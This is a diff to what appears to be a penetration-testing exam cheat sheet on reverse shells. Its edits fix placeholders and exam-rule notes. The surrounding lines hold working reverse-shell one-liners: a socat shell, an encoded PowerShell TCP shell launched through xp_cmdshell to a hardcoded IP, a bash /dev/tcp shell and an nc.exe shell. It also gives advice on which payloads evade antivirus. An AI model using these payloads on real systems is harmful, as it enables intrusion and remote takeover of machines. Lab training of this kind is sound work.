@@ -83,6 +83,8 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444
 SQL (SIGNED\Administrator dbo@master)> EXEC xp_cmdshell 'powershell -exec -bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAzADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
 ```
 
+> The encoded PowerShell example above embeds a hardcoded IP (10.10.14.237). Regenerate it with your own Kali IP before use.
+
 ### Linux shells
 
 ```bash
@@ -156,7 +158,7 @@ When injecting into a Python/Ruby exploit (-c flag):
 -c "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"
 
 # RIGHT — use PowerShell base64 (no quoting conflicts)
--c 'powershell -e '
+-c 'powershell -e <BASE64>'
 
 # RIGHT — use nc.exe (no quoting conflicts)
 -c 'C:\Windows\Temp\nc.exe YOUR_IP 80 -e cmd.exe'
@@ -171,7 +173,7 @@ If AV catches the payload:
 - msfvenom psh payload → Defender catches it easily
 - nc.exe → usually not caught
 - msfvenom exe → sometimes caught → try the exe-service or use the Metasploit handler
-- Metasploit → use exploit/multi/handler (no restrictions in eCPPT)
+- Metasploit → use exploit/multi/handler (check the current OffSec exam rules before relying on it)
 
 Windows shell decision tree:
 
@@ -182,10 +184,10 @@ Do you need a Windows reverse shell?
 │
 ├── Can you run PowerShell?      → powershell -e <BASE64>
 │
-├── Injecting via an exploit?    → -c 'powershell -e '
+├── Injecting via an exploit?    → -c 'powershell -e <BASE64>'
 │                              → or: -c 'C:\Windows\Temp\nc.exe IP PORT -e cmd'
 │
-├── Does AV block everything?    → Metasploit (no restrictions in eCPPT)
+├── Does AV block everything?    → Metasploit handler (when permitted by the exam rules)
 │
 └── Port blocked?                → use 80 or 443 instead of 4444
 ```
